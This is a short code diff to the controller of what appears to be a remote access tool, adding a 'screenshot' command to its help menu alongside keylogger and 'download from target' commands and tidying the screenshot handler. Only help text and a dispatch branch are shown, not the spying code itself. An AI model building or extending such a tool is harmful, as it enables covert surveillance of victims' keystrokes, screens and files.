@@ -130,7 +130,8 @@ class Server:
                     • keyscan_start - Start the keylogger.
 
                     • keyscan_stop - Stop the keylogger and save the log to a file in the script's directory.
-
+                    
+                    • screenshot - Take a screenshot and save the img in the script's directory.
 
                     • download <file_name> - Download a file from the target.
 
@@ -185,9 +186,6 @@ class Server:
 
             elif command.startswith('screenshot'):
                 self.screen_shot()
-
-                # thread_screen_shot = threading.Thread(target=self.screen_shot)
-                # thread_screen_shot.start()
                 continue
 
             else:
